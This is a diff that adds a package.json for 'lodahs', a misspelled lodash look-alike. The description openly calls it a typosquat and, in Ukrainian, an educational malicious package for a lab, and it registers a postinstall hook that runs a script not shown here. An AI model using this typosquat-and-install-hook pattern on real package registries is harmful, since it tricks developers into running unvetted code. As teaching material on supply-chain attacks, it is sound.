@@ -1,0 +1,10 @@
+{
+  "name": "lodahs",
+  "version": "4.17.21",
+  "description": "Lodash modular utilities (definitely not a typosquat 😈) — НАВЧАЛЬНИЙ шкідливий пакет для лабораторної X11",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node postinstall.js"
+  },
+  "license": "MIT"
+}
